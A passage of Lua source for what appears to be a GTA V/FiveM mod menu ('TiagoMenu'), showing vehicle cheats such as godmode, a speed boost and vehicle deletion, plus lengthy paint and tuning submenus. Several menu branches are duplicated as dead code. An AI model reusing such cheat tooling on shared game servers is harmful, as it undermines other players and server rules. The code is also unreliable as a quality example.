				elseif TiagoMenu.Button("~h~~r~Delete Vehicle") then
					DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle Deleted")
				elseif TiagoMenu.Button("~h~Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now dirty")
				elseif TiagoMenu.Button("~h~Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now clean")
				elseif
					TiagoMenu.CheckBox(
						"~h~No Fall",
						Nofall,
						function(enabled)
							Nofall = enabled

							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
						end
					)
				 then
				elseif
					TiagoMenu.CheckBox(
						"~h~Vehicle Godmode",
						VehGod,
						function(enabled)
							VehGod = enabled
						end
					)
				 then
				elseif
					TiagoMenu.CheckBox(
					"~h~Vehicle Speedboost ~g~Num9",
						VehSpeed,
						function(enabled)
						VehSpeed = enabled
						end)
				then
			elseif TiagoMenu.CheckBox(
                    "~h~Super Handling",
                    superGrip,
                    function(enabled)
                        superGrip = enabled
                        enchancedGrip = false
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif TiagoMenu.CheckBox(
                    "~h~Enhanced Grip",
                    enchancedGrip,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = enabled
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif TiagoMenu.CheckBox(
                    "~h~Drift Mode",
                    driftMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = enabled
                        fdMode = false
                    end)
                then
                elseif TiagoMenu.CheckBox(
                    "~h~Formula Drift Mode",
                    fdMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = false
                        fdMode = enabled
                    end)
                then
				elseif
					TiagoMenu.CheckBox(
						"~h~Super Grip",
						supergrip,
						function(enabled)
							supergrip = enabled
						end
					)
				then
				end
				TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('tunings') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(be) do
                    if da.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
                        if TiagoMenu.MenuButton(da.name, da.id) then
                        end
                    elseif da.id == 'neon' then
                        if TiagoMenu.MenuButton(da.name, da.id) then
                        end
                    elseif da.id == 'paint' then
                        if TiagoMenu.MenuButton(da.name, da.id) then
                        end
                    elseif da.id == 'wheeltypes' then
                        if TiagoMenu.MenuButton(da.name, da.id) then
                        end
                    else
                        local at = checkValidVehicleMods(da.id)
                        for dg, dh in pairs(at) do
                            if TiagoMenu.MenuButton(da.name, da.id) then
                            end
                            break
                        end
                    end
                end
                if IsToggleModOn(veh, 22) then
                    xenonStatus = 'Installed'
                else
                    xenonStatus = 'Not Installed'
                end
                if TiagoMenu.Button('Xenon Headlight', xenonStatus) then
                    if not IsToggleModOn(veh, 22) then
                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    else
                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(bf) do
                    if TiagoMenu.MenuButton(da.name, da.id) then
                    end
                end
                if IsToggleModOn(veh, 18) then
                    turboStatus = 'Installed'
                else
                    turboStatus = 'Not Installed'
                end
                if TiagoMenu.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
                    if not IsToggleModOn(veh, 18) then
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('primary') then
                TiagoMenu.MenuButton('~h~~p~-> ~s~Classic', 'classic1')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metallic', 'metallic1')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Matte', 'matte1')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metal', 'metal1')
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('secondary') then
                TiagoMenu.MenuButton('~h~~p~-> ~s~Classic', 'classic2')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metallic', 'metallic2')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Matte', 'matte2')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metal', 'metal2')
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('rimpaint') then
                TiagoMenu.MenuButton('~h~~p~-> ~s~Classic', 'classic3')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metallic', 'metallic3')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Matte', 'matte3')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metal', 'metal3')
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('classic1') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and tp == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metallic1') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and tp == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('matte1') then
                for dt, du in pairs(bj) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and tp == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metal1') then
                for dt, du in pairs(bk) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and tp == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('classic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metallic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('matte2') then
                for dt, du in pairs(bj) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metal2') then
                for dt, du in pairs(bk) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('classic3') then
                for dt, du in pairs(bh) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metallic3') then
                for dt, du in pairs(bh) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('matte3') then
                for dt, du in pairs(bj) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metal3') then
                for dt, du in pairs(bk) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
				TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(bf) do
                    if TiagoMenu.MenuButton(da.name, da.id) then
                    end
                end
                if IsToggleModOn(veh, 18) then
                    turboStatus = 'Installed'
                else
                    turboStatus = 'Not Installed'
                end
                if TiagoMenu.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
                    if not IsToggleModOn(veh, 18) then
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('primary') then
                TiagoMenu.MenuButton('~h~~p~-> ~s~Classic', 'classic1')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metallic', 'metallic1')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Matte', 'matte1')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metal', 'metal1')
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('secondary') then
                TiagoMenu.MenuButton('~h~~p~-> ~s~Classic', 'classic2')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metallic', 'metallic2')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Matte', 'matte2')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metal', 'metal2')
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('rimpaint') then
                TiagoMenu.MenuButton('~h~~p~-> ~s~Classic', 'classic3')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metallic', 'metallic3')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Matte', 'matte3')
                TiagoMenu.MenuButton('~h~~p~-> ~s~Metal', 'metal3')
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('classic1') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and tp == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metallic1') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and tp == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('matte1') then
                for dt, du in pairs(bj) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and tp == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metal1') then
                for dt, du in pairs(bk) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and tp == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            SetVehicleColours(veh, du.id, oldsec)
                            b9 = true
                        elseif b9 and curprim == du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and curprim ~= du.id then
                            SetVehicleColours(veh, du.id, oldsec)
                            SetVehicleExtraColours(veh, du.id, oldwheelcolour)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('classic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metallic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('matte2') then
                for dt, du in pairs(bj) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metal2') then
                for dt, du in pairs(bk) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            ba = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        elseif b9 and cursec == du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and cursec ~= du.id then
                            SetVehicleColours(veh, oldprim, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('classic3') then
                for dt, du in pairs(bh) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metallic3') then
                for dt, du in pairs(bh) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('matte3') then
                for dt, du in pairs(bj) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
